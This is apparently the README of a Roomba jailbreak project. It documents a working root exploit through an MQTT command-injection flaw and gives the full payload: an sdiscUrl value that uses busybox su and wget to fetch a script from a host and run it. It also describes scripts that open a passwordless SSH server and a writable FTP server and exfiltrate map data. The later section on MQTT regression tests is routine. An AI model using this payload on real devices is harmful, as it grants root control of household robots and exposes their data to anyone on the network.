# roomba::unjailed

These are the scripts for the roomba::unjailed project, a jailbreak for most `lewis` Roomba models (i,j series), with more support to come.

> Using this jailbreak will not make your Roomba less secure, unless you expose ports `1883` (internal MQTT broker) or `22` (runjailed SSH server). These allow unrestricted access to the `cleantrack` daemon, with no root password.

## Supported Versions

- 22.52.08+
- Everything else is untested!!

## Introduction

`runjailed.py` is the Python host script, as Roomba has Python 2.7 pre-installed.

`jailbreak.py` jailbreaks a Roomba, and downloads `runjailed.py` to it.

The exploit takes advantage of a MQTT input sanitization vulnerability, gaining ACE as the `apps` user.

Luckily for us, the Roomba is based on BusyBox, so it has `busybox.suid`, and it's one of the few commands `apps` is allowed to run.

We use the ACE vulnerability to gain root access and download the `runjailed` script, which performs the rest of the jailbreak with the included scripts.

## Features

| Feature | Status |
|---------|--------|
| Root ACE | ✅ |
| SSH, FTP | ✅ |
| Exfiltrate PMap data | ✅ |
| Expose new internal MQTT messages to the public | 🛠️ |
| Expose Timeline Report to the public | 🛠️ |
| Communication with mobility/auxiliary boards | 🛠️ |
| Downgrading | ⚠️ |

🛠️: WIP  
⚠️: WIP, risky  

## One-click SSH

`oneclick-ssh.sh` enables SSH on the robot in a single run: it serves `scripts/`
over HTTP, publishes the `sdiscUrl` payload over the robot's local MQTT broker
(port 8883, TLS), collects the beacons, and waits until TCP/22 answers.

```sh
# credentials either interactive, via env, or via flags
read -rs ROOMBA_PASSWORD && export ROOMBA_PASSWORD   # robot password (not the iRobot account one)
export ROOMBA_BLID=<blid>

./runjailed/oneclick-ssh.sh 192.168.178.50
```

Options: `--blid`, `--password`, `--host-ip`, `--http-port` (8899),
`--beacon-port` (8883), `--ssh-port` (22), `--timeout` (120), `--dry-run`
(prints the payload only). `PYTHON=/path/to/venv/bin/python` selects the
interpreter if the default one lacks `paho-mqtt`
(`pip install -r runjailed/requirements.txt`).

With `--no-serve` the script does not start a local file server and expects
`HOST:HTTP_PORT` to serve `runjailed/scripts/` already:

```sh
./runjailed/oneclick-ssh.sh <ROBOT-IP> --host-ip <PUBLIC-HOST> --http-port 8899 --no-serve
```

The robot then fetches the script from the public host and beacons back to
`HOST:BEACON_PORT`, which must be reachable from the robot as well.

Exit codes: `0` SSH reachable, `3` payload ran as root but the port is still
closed (the firewall picks up `SYSTEM_ACCESS="unlocked"` on the next start of
the connectivity services — reboot the robot and retry), `1` failure, `2` usage.

The payload the robot receives is one `sdiscUrl` string, at most 191 bytes:

```
https://$(/bin/busybox su -c 'wget -qO/tmp/e http://HOST:8899/enableSSH.sh;sh /tmp/e HOST 8899 8883')
```

`connectivity_manager` interpolates that value into
`echo "%s" | egrep -e '^https+[^;[:space:]]+$'` and runs it through `popen()`;
the double quotes do not stop `$(...)`, so the command runs before the URL is
validated. Same process, same 191-byte limit for every manual send:
`runjailed.py --send '<url>'` or `--enable-ssh HOST[:PORT]`.

## MQTT lifecycle regression checks (offline)

`runjailed.py` uses Paho's `loop_start()` thread as the network writer. The main
thread publishes only after a successful CONNACK and retains each
`MQTTMessageInfo` until `wait_for_publish(timeout=5)` and `is_published()` confirm
its complete **local socket send**. QoS 0 has no broker acknowledgement: this
is not proof of robot processing, script execution, root access, or working SSH.
The topic (`delta`), `state.sdiscUrl` JSON, and QoS 0/non-retained header (`0x30`)
are unchanged. The public `sendCmd()` helper still returns a local-enqueue bool.

TCP/TLS connection establishment uses Paho's 10-second connect timeout, followed
by a separate 10-second CONNACK limit. Use a numeric robot IP as documented;
OS hostname resolution is not covered by Paho's socket timeout. Authentication,
disconnect, enqueue, and local-send failures terminate nonzero without reconnect
or publish retries. Send delays and beacon linger must be finite and nonnegative.
Cleanup disconnects, allows up to one second for graceful network shutdown, then
unblocks a stalled socket before joining the Paho loop. The HTTP beacon server is
also shut down. Without `--send`/`--enable-ssh`, passive monitoring remains active
until disconnect or interruption.

Run the suite from the repository root with a Python environment containing
`pytest` and `runjailed/requirements.txt`:

```sh
python -m pytest -q
```

The real-Paho regression uses only an in-process socketpair, not TLS, a TCP
listener, or a robot. It caps writes at three bytes and pauses a partial
SUBSCRIBE while the main thread queues PUBLISH. It checks one network writer and
byte-exact, noninterleaved SUBSCRIBE/PUBLISH/DISCONNECT packets. Additional real
Paho cases cover rejected authentication, missing CONNACK, peer loss, and a
permanently unwritable publish (including bounded cleanup); CLI tests cover
failure exits, delays, credentials from the environment, and legacy options.

## Scripts

> `runjailed` and these scripts assume you already have obtained root access. Note that you can perform most of the scripts anyways using the BusyBox SUID script, but it's better to have root anyway.

- `oneclick-ssh.sh`: Host script — serves the scripts, sends the MQTT payload, waits for SSH (see above).
- `enableSSH.sh`: Runs on the robot as root: fetches `sshd.socket`, unlocks `SYSTEM_ACCESS`, enables the socket unit.
- `jailbreak.sh`: The initial script, only ran once by `jailbreak.py`, runs `sshd.sh` to begin an SSH server for a more stable connection.
- `enableDevMode.sh`: Sets the provisioning configuration key `DEV_MODE` to `enabled` from `disabled`.
- `ftp.sh`: Uses `tcpsvd` to host a simple FTPd server with write access from the `/` root on port 21.
- `sshd.sh`: Opens a SSH server on port 21.
- `unlock.sh`:  Sets the provisioning configuration key `SYSTEM_ACCESS` to `unlocked` from `locked`. This brings down the strict firewall rules.